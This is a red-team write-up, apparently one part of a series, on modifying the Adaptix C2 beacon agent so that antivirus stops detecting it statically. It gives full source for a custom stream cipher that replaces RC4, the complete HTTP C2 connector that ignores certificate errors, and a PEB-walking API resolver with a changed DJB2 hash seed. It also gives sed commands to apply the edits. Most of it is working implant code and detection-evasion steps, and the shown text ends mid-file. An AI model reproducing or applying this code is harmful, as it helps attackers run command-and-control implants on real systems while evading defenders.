---
title: "Custom Cipher, Hash Seed, and Structural Changes"
kicker: "Red Team . Static Evasion . Source Modification"
tags: "Adaptix C2 . OPSEC . Red Team . Static Evasion . Custom Cipher"
lead: "The final part of the agent static signature modifications. Replacing RC4 with a custom stream cipher, changing the DJB2 hash seed, reordering functions, adding junk code, and stripping SEH metadata to change what the compiled beacon looks like without changing what it does."
---

> This guide assumes a working Adaptix C2 deployment with the hardening from [Part 3: Beacon Source Modifications](writeup.html?file=writeups/adaptix-beacon-mods.md) already applied.



## What I Did in This Round

Part 3 fixed specific byte patterns ThreatCheck pointed to. This round changes things at a broader level:

1. **Replaced RC4 with a custom stream cipher.** RC4's initialization pattern is a well-known AV signature.
2. **Changed the DJB2 hash seed** from 1572 to 7349, which changes all 200+ hash constants in `.rdata`.
3. **Reordered functions, renamed variables, added junk code.** Shifts byte patterns and breaks cross-function signatures.
4. **Stripped SEH metadata** (`.pdata`/`.xdata` sections) that ThreatCheck flagged at offset 0x18704.

Same goal as Part 3: change what the compiled binary looks like without changing what it does.

---

## How the Beacon Works

The **agent plugin** and the **listener plugin** are two separate Go plugins. Both have their own copy of the encryption code. If you change the cipher in one but not the other, the beacon connects but never registers because the listener can't decrypt the heartbeat. See [The Listener Plugin Bug](#the-listener-plugin-bug).

---

## Files I Modified

Here is every file I touched, with the full path on the server and what I changed.

**C++ Beacon Source** (in `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/`):

| #   | File                | What Changed                                          |
| --- | ------------------- | ----------------------------------------------------- |
| 1   | `Crypt.cpp`         | Complete rewrite. New cipher implementation.          |
| 2   | `Crypt.h`           | Updated function names (`EncryptData`/`DecryptData`). |
| 3   | `Agent.cpp`         | One line: `EncryptRC4` renamed to `EncryptData`.      |
| 4   | `AgentConfig.cpp`   | One line: `DecryptRC4` renamed to `DecryptData`.      |
| 5   | `ConnectorHTTP.cpp` | Two calls: `EncryptRC4`/`DecryptRC4` renamed.         |
| 6   | `ConnectorDNS.cpp`  | Ten calls: `EncryptRC4`/`DecryptRC4` renamed.         |
| 7   | `ConnectorSMB.cpp`  | Two calls: `EncryptRC4`/`DecryptRC4` renamed.         |
| 8   | `ConnectorTCP.cpp`  | Two calls: `EncryptRC4`/`DecryptRC4` renamed.         |
| 9   | `ProcLoader.cpp`    | DJB2 seed changed to 7349, all variables renamed.     |
| 10  | `MainAgent.cpp`     | Functions reordered, junk code added.                 |
| 11  | `WaitMask.cpp`      | Functions reordered, junk code added.                 |
| 12  | `Encoders.cpp`      | Functions reordered, variables renamed.               |

**Build System** (in `AdaptixServer/extenders/beacon_agent/src_beacon/`):

| #   | File       | What Changed                                                              |
| --- | ---------- | ------------------------------------------------------------------------- |
| 13  | `Makefile` | Added SEH metadata stripping with objcopy after compilation. |

**Hash Generator** (in `AdaptixServer/extenders/beacon_agent/src_beacon/files/`):

| #   | File        | What Changed                                                 |
| --- | ----------- | ------------------------------------------------------------ |
| 14  | `hashes.py` | DJB2 seed to 7349, null byte fix, 4 missing functions added. |

**Go Agent Plugin** (in `AdaptixServer/extenders/beacon_agent/`):

| #   | File          | What Changed                                                                         |
| --- | ------------- | ------------------------------------------------------------------------------------ |
| 15  | `pl_utils.go` | `RC4Crypt` function body replaced with custom cipher. Removed `"crypto/rc4"` import. |

**Auto-Generated** (must regenerate after changing `hashes.py`):

| #   | File           | How                                                                          |
| --- | -------------- | ---------------------------------------------------------------------------- |
| 16  | `ApiDefines.h` | Run `python3 hashes.py > ../beacon/ApiDefines.h` from the `files/` directory |

**Go Listener Plugins** (fixed during troubleshooting):

| #   | File              | What Changed                                                                                                                                                                                                                                    |
| --- | ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 17  | `pl_transport.go` | Added `streamCipherCrypt` function (line 31), removed `"crypto/rc4"` import, replaced `rc4.NewCipher()`/`XORKeyStream()` call at line 446 with `streamCipherCrypt()`.                                                                           |
| 18  | `pl_main.go`      | Added `streamCipherCrypt` function (line 13), removed `"crypto/rc4"` import, replaced `rc4.NewCipher()`/`XORKeyStream()` call at line 193 with `streamCipherCrypt()`.                                                                           |
| 19  | `pl_main.go`      | Added `streamCipherCrypt` function (line 13), removed `"crypto/rc4"` import, replaced `rc4.NewCipher()`/`XORKeyStream()` call at line 196 with `streamCipherCrypt()`.                                                                           |
| 20  | `pl_transport.go` | Added `streamCipherCrypt` function (line 25), removed `"crypto/rc4"` import, replaced the `rc4Crypt` utility function (line 984) to call `streamCipherCrypt` internally. The `rc4Crypt` wrapper is called at lines 296, 329, 372, 424, and 736. |

**Total: 20 files** (12 C++ source, 1 Makefile, 1 Python, 5 Go, 1 auto-generated)

---

## Change 10: Replacing RC4 with a Custom Stream Cipher

### Why RC4 Had to Go

RC4 initializes a 256-byte state array with sequential values: `state[i] = i` (0x00, 0x01, 0x02, ... 0xFF). That pattern compiles into a very recognizable loop that AV engines have been signaturing for years. It doesn't matter that RC4 itself is cryptographically adequate for this use case. The problem is that the compiled initialization code is a known indicator of "this binary does RC4," and Defender flags it.

The replacement is a custom stream cipher that works the same way (symmetric, XOR-based, same function encrypts and decrypts) but produces completely different compiled instructions. The initialization, key schedule, and stream generation all use different arithmetic, so the binary looks nothing like RC4 to a pattern scanner.

This is not a cryptographic upgrade. It's a signature evasion change.

### Crypt.cpp (Full File)

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Crypt.cpp`

```cpp
#include "Crypt.h"

static void StreamInit(unsigned char* key, unsigned char* state, int keyLen)
{
    unsigned char t;
    int i, k = 0;

    for (i = 0; i < 256; i++)
        state[i] = (unsigned char)((i * 167 + 53) & 0xFF);

    for (i = 0; i < 256; i++) {
        k = (k + state[i] + key[i % keyLen] + i) & 0xFF;
        t = state[i];
        state[i] = state[k];
        state[k] = t;
    }

    for (i = 0; i < 256; i++) {
        k = (k + state[i] + key[(i + 3) % keyLen]) & 0xFF;
        t = state[i];
        state[i] = state[k];
        state[k] = t;
    }
}

static void StreamTransform(unsigned char* buf, int bufLen, unsigned char* state)
{
    unsigned char t;
    int a = 0, b = 0, n;

    for (n = 0; n < bufLen; n++) {
        a = (a + 1) & 0xFF;
        b = (b + state[a] + state[(a * 3) & 0xFF]) & 0xFF;

        t = state[a];
        state[a] = state[b];
        state[b] = t;

        buf[n] ^= state[(state[a] + state[b] + 1) & 0xFF];
    }
}

void EncryptData(unsigned char* data, int dataLength, unsigned char* key, int keyLength)
{
    unsigned char S[256];
    StreamInit(key, S, keyLength);
    StreamTransform(data, dataLength, S);
}

void DecryptData(unsigned char* data, int dataLength, unsigned char* key, int keyLength)
{
    EncryptData(data, dataLength, key, keyLength);
}
```

### Crypt.h (Full File)

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Crypt.h`

```cpp
#pragma once

void EncryptData(unsigned char* data, int dataLength, unsigned char* key, int keyLength);

void DecryptData(unsigned char* data, int dataLength, unsigned char* key, int keyLength);
```

### Server-Side Cipher - pl_utils.go

**Server path:** `AdaptixServer/extenders/beacon_agent/pl_utils.go`

The Go server needs the exact same cipher so it can decrypt what the beacon sends and encrypt what it sends back. The function is called `RC4Crypt` to keep the same name that the rest of the codebase calls, but the body is completely new.

I also removed the `"crypto/rc4"` import from the top of `pl_utils.go` since it's no longer used.

**The `RC4Crypt` function (at line 206 in `pl_utils.go`, replace the existing one):**

```go
func RC4Crypt(data []byte, key []byte) ([]byte, error) {
	if len(key) == 0 {
		return nil, errors.New("empty key")
	}

	var state [256]byte
	keyLen := len(key)

	for i := 0; i < 256; i++ {
		state[i] = byte((i*167 + 53) & 0xFF)
	}

	k := 0
	for i := 0; i < 256; i++ {
		k = (k + int(state[i]) + int(key[i%keyLen]) + i) & 0xFF
		state[i], state[k] = state[k], state[i]
	}
	for i := 0; i < 256; i++ {
		k = (k + int(state[i]) + int(key[(i+3)%keyLen])) & 0xFF
		state[i], state[k] = state[k], state[i]
	}

	out := make([]byte, len(data))
	copy(out, data)

	a, b := 0, 0
	for n := 0; n < len(out); n++ {
		a = (a + 1) & 0xFF
		b = (b + int(state[a]) + int(state[(a*3)&0xFF])) & 0xFF
		state[a], state[b] = state[b], state[a]
		out[n] ^= state[(int(state[a])+int(state[b])+1)&0xFF]
	}

	return out, nil
}
```

### Updating the Encrypt/Decrypt Calls in Every Connector

Renamed `EncryptRC4`/`DecryptRC4` to `EncryptData`/`DecryptData` in all six files that call them:

**Agent.cpp** (`AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Agent.cpp`, line 109):
```cpp
// Was: EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
EncryptData(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
```

**AgentConfig.cpp** (`AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.cpp`, line 31):
```cpp
// Was: DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
DecryptData(packer->data()+4, profileSize, this->encrypt_key, 16);
```

**ConnectorHTTP.cpp** (`AdaptixServer/extenders/beacon_agent/src_beacon/beacon/ConnectorHTTP.cpp`). Changed lines are in `Exchange()` at the bottom:

```cpp
#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"


BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}


void* ConnectorHTTP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorHTTP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorHTTP));
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;

	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
	}
}

BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
	LPSTR encBeat = b64_encode(beat, beatSize);

	ULONG enc_beat_length = StrLenA(encBeat);
	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = NULL;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*)profile.http_method;
	this->uri_count      = profile.uri_count;
	this->uris           = (CHAR**) profile.uris;
	this->ua_count       = profile.ua_count;
	this->user_agents    = (CHAR**) profile.user_agents;
	this->hh_count       = profile.hh_count;
	this->host_headers   = (CHAR**) profile.host_headers;
	this->rotation_mode  = profile.rotation_mode;
	this->ans_size       = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	this->proxy_type     = profile.proxy_type;
	this->proxy_username = (CHAR*)profile.proxy_username;
	this->proxy_password = (CHAR*)profile.proxy_password;

	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		ULONG prefixLen = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			prefixLen = 8;
		}
		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			this->proxy_url[idx++] = 'h';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 'p';
			this->proxy_url[idx++] = 's';
			this->proxy_url[idx++] = ':';
			this->proxy_url[idx++] = '/';
			this->proxy_url[idx++] = '/';
		}
		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		this->proxy_url[idx++] = ':';
		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;
	DWORD context = 0;

	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		DWORD dwError = 0;

		if (!this->hInternet) {
			CHAR* currentUA = this->user_agents[this->ua_index];
			if (this->proxy_url != NULL) {
				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
			}
			else {
				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
			}
		}
		if (this->hInternet) {

			if (!this->hConnect)
				this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);

			if (this->hConnect)
			{
				CHAR acceptTypes[] = { '*', '/', '*', 0 };
				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
				if (this->ssl)
					flags |= INTERNET_FLAG_SECURE;

				CHAR* currentUri = this->uris[this->uri_index];
				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
				if (hRequest) {
					if (this->ssl) {
						DWORD dwFlags = 0;
						DWORD dwBuffer = sizeof(DWORD);
						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
						if (!result) {
							dwFlags = 0;
						}
						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
					}

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
						if (this->proxy_password != NULL) {
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
						}
					}

					CHAR* reqHeaders = this->headers;
					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(this->headers);
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);

					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						this->functions->LocalFree(tmpHeaders);
					}
					if (connected) {
						char statusCode[255];
						DWORD statusCodeLenght = 255;
						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);

						if (result && _atoi(statusCode) == 200) {
							DWORD answerSize = 0;
							DWORD dwLengthDataSize = sizeof(DWORD);
							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);

							if (result) {
								DWORD dwNumberOfBytesAvailable = 0;
								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);

								if (result && answerSize > 0) {
									ULONG numberReadedBytes = 0;
									DWORD readedBytes = 0;
									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);

									while (numberReadedBytes < answerSize) {
										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
										if (!result || !readedBytes) {
											break;
										}
										numberReadedBytes += readedBytes;
									}
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
							}
							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
								DWORD dwNumberOfBytesAvailable = 0;

								while (1) {
									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
									if (!result || !dwNumberOfBytesAvailable)
										break;

									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
									if (!result || !readedBytes) {
										break;
									}
									numberReadedBytes += readedBytes;
								}

								if (numberReadedBytes) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
								else {
									this->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = this->functions->GetLastError();
					}
					this->functions->InternetCloseHandle(hRequest);
				}
			}

			attempt++;
			if (!connected) {
				if (this->hConnect) {
					this->functions->InternetCloseHandle(this->hConnect);
					this->hConnect = NULL;
				}
				if (this->hInternet) {
					this->functions->InternetCloseHandle(this->hInternet);
					this->hInternet = NULL;
				}

				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);

				this->server_index = (this->server_index + 1) % this->server_count;
			}

			if (this->rotation_mode == 1) {
				this->uri_index = GenerateRandom32() % this->uri_count;
				this->ua_index = GenerateRandom32() % this->ua_count;
				this->server_index = GenerateRandom32() % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = GenerateRandom32() % this->hh_count;
			}
			else {
				this->uri_index = (this->uri_index + 1) % this->uri_count;
				this->ua_index = (this->ua_index + 1) % this->ua_count;
				this->server_index = (this->server_index + 1) % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = (this->hh_index + 1) % this->hh_count;
			}
		}
	}
}

BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return NULL;
}

int ConnectorHTTP::RecvSize()
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		EncryptData(plainData, plainSize, sessionKey, 16);
		this->SendData(plainData, plainSize);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr)
			DecryptData(dataPtr, dataSize, sessionKey, 16);
	}
}

void ConnectorHTTP::CloseConnector()
{
	DWORD l = StrLenA(this->headers);
	memset(this->headers, 0, l);
	this->functions->LocalFree(this->headers);
	this->headers = NULL;

	this->functions->InternetCloseHandle(this->hInternet);
	this->functions->InternetCloseHandle(this->hConnect);
}
```

**ConnectorSMB.cpp**, **ConnectorTCP.cpp**, and **ConnectorDNS.cpp** have the same rename. Apply to all connector files with find-and-replace:

```bash
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon/beacon
sed -i 's/EncryptRC4/EncryptData/g; s/DecryptRC4/DecryptData/g' ConnectorDNS.cpp ConnectorSMB.cpp ConnectorTCP.cpp ConnectorHTTP.cpp Agent.cpp AgentConfig.cpp
```

---

## Change 11: DJB2 Hash Seed Change and Variable Renames in ProcLoader.cpp

The beacon resolves API functions at runtime by hashing their names with DJB2 and comparing against precomputed constants in `ApiDefines.h`. Changing the seed from 1572 to 7349 changes all 200+ constants, making the `.rdata` section look completely different. Variables were also renamed throughout the file.

### ProcLoader.cpp (Full File)

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/ProcLoader.cpp`

```cpp
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "utils.h"
#include "ntdll.h"

ULONG Djb2A(PUCHAR str)
{
    if (str == NULL)
        return 0;

    ULONG val = 7349;
    int ch;
    while (ch = *str++) {
        if (ch >= 'A' && ch <= 'Z')
            ch += 0x20;
        val = ((val << 5) + val) + ch;
    }
    return val;
}

ULONG Djb2W(PWCHAR str)
{
    if (str == NULL)
        return 0;

    ULONG val = 7349;
    int ch;
    while (ch = *str++) {
        if (ch >= L'A' && ch <= L'Z')
            ch += 0x20;
        val = ((val << 5) + val) + ch;
    }
    return val;
}

HMODULE GetModuleAddress(ULONG targetHash)
{

#ifdef _M_IX86
    PEB* peb = (PEB*)__readfsdword(0x30);
#else
    PEB* peb = (PEB*)__readgsqword(0x60);
#endif

    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* modList = NULL;
    modList = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* first = modList->Flink;

    for (LIST_ENTRY* cur = first; cur != modList; cur = cur->Flink) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)cur - sizeof(LIST_ENTRY));
        if ( Djb2W((PWCHAR)entry->BaseDllName.Buffer) == targetHash )
            return (HMODULE)entry->DllBase;
    }
    return NULL;
}

LPVOID GetSymbolAddress(HANDLE hMod, ULONG targetHash)
{
    static int depth = 0;
    if (depth > 6)
        return NULL;

    if (hMod == NULL)
        return 0;

    depth++;

    uintptr_t base = (uintptr_t) hMod;

    PIMAGE_NT_HEADERS       ntHdr       = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    PIMAGE_DATA_DIRECTORY   dataDir     = (PIMAGE_DATA_DIRECTORY)&ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY expDir      = (PIMAGE_EXPORT_DIRECTORY)(base + dataDir->VirtualAddress);

    uintptr_t addrTable  = base + expDir->AddressOfFunctions;
    uintptr_t nameTable  = base + expDir->AddressOfNames;
    uintptr_t ordTable   = base + expDir->AddressOfNameOrdinals;
    uintptr_t resolved   = 0;
    DWORD     funcAddr   = 0;

    DWORD remaining = expDir->NumberOfNames;
    while (remaining--) {
        PUCHAR funcName = (PUCHAR)(base + *(DWORD*)nameTable);
        if ( Djb2A(funcName) == targetHash ) {
            addrTable += (*(WORD*)ordTable * sizeof(DWORD));
            funcAddr   = *(DWORD*)addrTable;
            resolved   = base + funcAddr;

            if ( dataDir->VirtualAddress < funcAddr && funcAddr < dataDir->VirtualAddress + dataDir->Size ) {
                char* fwd = (char*)(resolved);
                char  fwdMod[64]  = { 0 };
                char  fwdFunc[64] = { 0 };

                int idx = StrIndexA(fwd, '.');
                if (idx >= 0) {
                    memcpy(fwdMod, fwd, ++idx);
                    fwdMod[idx    ] = 'd';
                    fwdMod[idx + 1] = 'l';
                    fwdMod[idx + 2] = 'l';
                    fwdMod[idx + 3] = 0;

                    memcpy(fwdFunc, fwd + idx, StrLenA(fwd) - idx + 1);

                    BOOL isVirtual = FALSE;
                    char pfxA[] = {'a','p','i','-','m','s','-','w','i','n','-',0};
                    char pfxE[] = {'e','x','t','-','m','s','-',0};
                    if (StrLenA(fwdMod) > 11 && StrNCmpA(fwdMod, pfxA, 11) == 0)
                        isVirtual = TRUE;
                    else if (StrLenA(fwdMod) > 7 && StrNCmpA(fwdMod, pfxE, 7) == 0)
                        isVirtual = TRUE;

                    HMODULE hFwd = ApiWin->LoadLibraryA(fwdMod);

                    if (hFwd) {
                        LPVOID r = NULL;

                        if (isVirtual) {
                            r = (LPVOID)ApiWin->GetProcAddress(hFwd, fwdFunc);
                        }
                        else {
                            ULONG h = Djb2A((PUCHAR)fwdFunc);
                            r = GetSymbolAddress(hFwd, h);
                        }

